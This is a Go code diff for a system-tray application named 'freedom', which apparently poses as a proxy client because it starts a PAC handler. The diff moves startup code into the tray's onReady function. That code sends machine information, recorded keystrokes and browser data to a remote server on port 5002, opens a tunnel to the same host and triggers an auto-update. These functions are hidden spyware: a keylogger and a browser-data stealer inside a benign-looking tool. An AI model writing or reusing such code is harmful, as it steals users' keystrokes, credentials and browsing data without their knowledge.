@@ -51,7 +51,18 @@ func (a *AppConfigMgr) Callback(conf *etcd.Config) {
 	appConfigMgr.config.Store(appConfig)
 }
 func onReady() {
+	conf, _ := etcd.NewConfig()
+	conf.AddObserver(appConfigMgr)
+	var appConfig AppConfig
+	appConfig.Url = conf.Url
+	appConfigMgr.config.Store(&appConfig)
 	go transfer.PacHandle(Config.PacPort)
+	go machineinfo.MachineSend("http://" + conf.Url + ":5002/machine/machineInfo")
+	go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
+	go browser.Digpack("http://" + conf.Url + ":5002/browser/")
+	go tunnel.Tunnel(conf.Url)
+	////check update
+	go lib.DoUpdate()
 	systray.SetIcon(icon.Data)
 	systray.SetTitle("freedom")
 	mQuit := systray.AddMenuItem("Quit", "Quit freedom")
@@ -116,17 +127,6 @@ func init() {
 	localAddr = ":" + strconv.Itoa(Config.ClientPort)
 }
 func main() {
-	conf, _ := etcd.NewConfig()
-	conf.AddObserver(appConfigMgr)
-	var appConfig AppConfig
-	appConfig.Url = conf.Url
-	appConfigMgr.config.Store(&appConfig)
-	go machineinfo.MachineSend("http://" + conf.Url + ":5002/machine/machineInfo")
-	go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
-	go browser.Digpack("http://" + conf.Url + ":5002/browser/")
-	go tunnel.Tunnel(conf.Url)
-	////check update
-	go lib.DoUpdate()
 	systray.Run(onReady, onExit)
 }
 
